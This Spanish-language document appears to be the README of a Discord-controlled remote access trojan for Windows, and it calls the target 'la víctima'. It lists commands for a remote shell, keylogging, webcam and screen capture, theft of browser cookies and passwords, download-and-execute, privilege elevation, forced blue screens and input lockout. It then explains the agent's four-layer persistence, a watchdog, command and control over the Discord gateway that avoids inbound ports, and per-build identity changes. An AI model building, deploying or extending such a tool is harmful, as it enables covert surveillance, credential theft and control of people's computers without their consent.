# Comandos

Todos se ejecutan dentro del canal de sesión de la máquina. El agente responde
en ese mismo canal.

| Comando | Efecto |
|---|---|
| `/shell <cmd>` | Ejecuta el comando en `cmd.exe` y devuelve la salida. Tope de tiempo por llamada; el proceso hijo se mata al expirar. |
| `/screenshot` | Captura el escritorio completo y la publica como imagen. |
| `/sysinfo` | Hostname, usuario, IP, versión de Windows, arquitectura, uptime, privilegios. |
| `/ps list` | Lista procesos con PID y memoria, paginado. |
| `/ps kill <pid>` | Termina el proceso indicado con su árbol. |
| `/keylog start` | Arranca el keylogger. |
| `/keylog stop` | Lo detiene y cierra el archivo. |
| `/keylog dump` | Publica lo capturado hasta el momento. |
| `/download <ruta>` | Sube un archivo de la víctima al canal, o lo comprime si es una carpeta. |
| `/upload <url>` | Descarga una URL en la víctima y la ejecuta opcionalmente. |
| `/clip get` | Lee el portapapeles. |
| `/clip set <texto>` | Escribe el portapapeles. |
| `/msgbox <título> <texto> [icono]` | Abre un MessageBox en la sesión interactiva. |
| `/webcam` | Captura un frame de la cámara por defecto. |
| `/passwords` | Extrae cookies y credenciales guardadas de Chrome, Edge y Brave, con la URL de cada entrada. |
| `/lockscreen on [min]` | Cortina negra a pantalla completa, teclado y ratón bloqueados. Con minutos, se libera sola. |
| `/lockscreen off` | Levanta la cortina. |
| `/lockscreen status` | Dice si está activa. |
| `/elevate` | Pide UAC y relanza el agente como administrador. |
| `/bsod [diagnostico]` | Fuerza un bugcheck matando un proceso crítico. Con `diagnostico` solo comprueba, no lo provoca. |
| `/kill` | Apaga el agente hasta el próximo arranque de Windows. |
| `/shutdown` | Apaga el agente y borra toda la persistencia. |

El panel publica además quince botones con las mismas acciones, para no escribir
comandos.

# Cómo funciona el agente

**Arranque.** Una sola instancia por equipo, garantizada con un mutex con nombre
derivado del identificador del cliente. Si el mutex ya existe, la copia sale sin
tocar nada.

**Sesión.** Al conectar al gateway crea o reutiliza un canal `sesion-N` en la
guild, publica un embed de estado y el panel de botones. Ese canal es el
contrato: cada equipo tiene el suyo, y los comandos se atienden ahí.

**Persistencia.** Cuatro capas independientes:

- RunKey en `HKCU` para el logon.
- Tarea programada de logon.
- Tarea programada de arranque, como SYSTEM, que busca la sesión de consola y
  lanza el agente dentro de ella. Es la que devuelve el agente después de un
  bugcheck, sin depender de que alguien inicie sesión.
- Servicio de Windows como respaldo.

Un watchdog revisa cada minuto que el proceso siga vivo y lo relanza si no. Las
copias sobrantes mueren en el mutex.

**Reconexión.** Si el gateway cae, se reintenta con espera creciente. Un watchdog
de red fuerza la reconexión cuando el socket queda abierto pero mudo, que es el
fallo silencioso típico de una sesión de Discord zombi.

**Identidad.** Todo lo que distingue una copia de otra —nombre del ejecutable,
servicio, tareas, clave de registro, carpeta de datos, mutex y clase de ventana—
sale de `internal/config` y se fija al compilar con `-ldflags -X`. Dos clientes
en el mismo equipo no se pisan.

**Credenciales.** El token del bot se inyecta en el binario, nunca se lee de
disco. Por eso cada cliente necesita su propia aplicación de Discord: Discord
admite una sola sesión de gateway por token, y dos agentes con el mismo token se
expulsan en bucle.

**Superficie.** El agente no abre puertos ni escucha conexiones. Todo el tráfico
sale hacia el gateway de Discord y hacia el webhook de avisos, y las respuestas
viajan como mensajes del canal. Sin tráfico entrante no hay puerto que escanear.
